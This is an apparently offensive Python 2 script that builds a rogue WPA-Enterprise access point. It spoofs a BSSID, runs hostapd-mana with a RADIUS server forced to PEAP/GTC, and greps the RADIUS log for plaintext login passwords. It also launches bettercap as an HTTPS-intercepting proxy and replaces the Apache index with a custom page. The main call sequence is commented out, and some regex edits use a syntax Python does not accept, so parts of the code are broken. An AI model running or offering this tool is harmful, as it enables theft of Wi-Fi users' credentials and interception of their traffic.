import sys,os,time,re
from ConfigParser import SafeConfigParser

interface = sys.argv[1]
essid = sys.argv[2]
bssid = "1a:23:56:b4:90:6c"
channel = str(1)

def create_logs():
    os.system("touch radius.log")
    os.system("echo '' > radius.log")
    os.system("echo '' > log")

def config_apache():
    os.system("rm /var/www/html/index*")
    os.system("echo '' > /var/log/apache2/access.log")
    file = open("/var/www/html/index.html","w")
    htmlContent = """ <style>\nimg{\nposition: fixed; right: 0; bottom: 0;\nmin-width: 100%; min-height: 100%;\nwidth: auto; height: auto; z-index: -100;\nbackground: url(polina.jpg) no-repeat;
    \nbackground-size: cover;\n}\n</style>\n<img src="kid.jpg">\n<video autoplay>\n<source src="video" type="video/mp4">\n</video> """
    file.write(htmlContent)
    file.close()
    os.system("service apache2 restart")
    
def config_interface():
    os.system("sudo nmcli radio wifi off")
    os.system("sudo rfkill unblock wlan")
    os.system("ifconfig "+interface+" down")
    os.system("ifconfig "+interface+" hw ether "+bssid+" 192.168.10.254 up")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def config_iptables():
    os.system("sudo iptables -t nat -I POSTROUTING 1 -p udp --dport 1812 -j ACCEPT")
    os.system("sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    
def config_dhcp():
    os.system("echo > /etc/dnsmasq.leases")
    dhcp = open("dnsmasq.conf","w")
    dhcp.write("interface="+interface+"\n")
    dhcp.write("dhcp-range=192.168.10.5,192.168.10.20\n")
    dhcp.write("dhcp-leasefile=/etc/dnsmasq.leases\n")
    dhcp.write("dhcp-authoritative\n")
    dhcp.close()
    os.system("cat dnsmasq.conf > /etc/dnsmasq.conf")
    os.system("service dnsmasq restart")
    
def config_radius():
    text = open("/usr/local/etc/raddb/eap.conf","r").read()
    text = re.sub("/^([\s]*eap \{.*?default_eap_type =) .*?$/m","\\1 peap",text)
    text = re.sub("/^([\s]*peap \{.*?default_eap_type =) .*?$/m","\\1 gtc",text)
    file = open("/usr/local/etc/raddb/eap.conf","w")
    file.write(text)
    file.close()
    
def config_hostapd():
    content = "interface="+ interface+"\nchannel="+channel+"\n" \
                  "ssid="+essid+"\nieee8021x=1\nauth_server_addr=127.0.0.1\nauth_server_port=1812\n" \
                  "auth_server_shared_secret=testing123\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\n"
    file = open("hostapd.conf","w")
    file.write(content)
    file.close()

def start_all():
    os.system("xterm -T 'RADIUS DEBUG' -e 'radiusd -X | tee radius.log' &")
    os.system("xterm -T 'HOSTAPD DEBUG' -e /usr/lib/mana-toolkit/hostapd -d hostapd.conf &")
    os.system("xterm -T 'GTC PASSWORDS' -e 'tail -f radius.log | grep \"login attempt with password\\|Identity -\"' &")
    os.system("xterm -T 'Bettercap' -e bettercap -I "+interface+" --no-discovery --no-spoofing --proxy --proxy-https POST -X --log log &")
    os.system("xterm -T 'Apache2' -e tail -f /var/log/apache2/access.log &")

parser = SafeConfigParser()
parser.read('/usr/local/etc/raddb/eap.conf')

for section_name in parser.sections():
    print 'Section:', section_name
    print '  Options:', parser.options(section_name)
    for name, value in parser.items(section_name):
        print '  %s = %s' % (name, value)
    print    
    
'''    
create_logs()
config_apache()
config_interface()
config_dhcp()
config_radius()
config_hostapd()
start_all()
time.sleep(8)
config_iptables()

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        os.system("killall radiusd")
        os.system("killall hostapd")
        os.system("killall bettercap")
        os.system("iptables -t nat -F")
        os.system("service dnsmasq stop")
        os.system("service apache2 stop")
        sys.exit(0)
'''
